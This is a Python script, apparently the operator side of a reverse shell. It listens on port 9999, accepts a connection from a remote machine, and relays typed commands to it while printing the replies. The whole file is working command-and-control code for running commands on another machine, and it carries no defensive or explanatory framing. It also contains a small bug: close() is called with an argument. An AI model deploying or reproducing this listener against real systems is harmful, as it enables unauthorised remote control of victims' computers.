import socket
import sys
# creating the socket


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f"Error occured : {str(msg)}")
# binding the socket and checking for connection


def bind_socket():
    try:
        global host
        global port
        global s
        print(f"Binding the socket with port {port}.")
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(f"error occured in binding : {str(msg)} ...retrying")
        bind_socket()
# establish connection between socket(socket must be listning)


def socket_accept():
    # s.accept returns two arguments one is coonection status and address(ip,host)
    conn, addr = s.accept()
    print(f"Connection is established with ip {addr[0]} and port {addr[1]}.")
    send_command(conn)
    s.close(conn)
# send command to rmote machine


def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
# main function


def main():
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == "__main__":
    main()
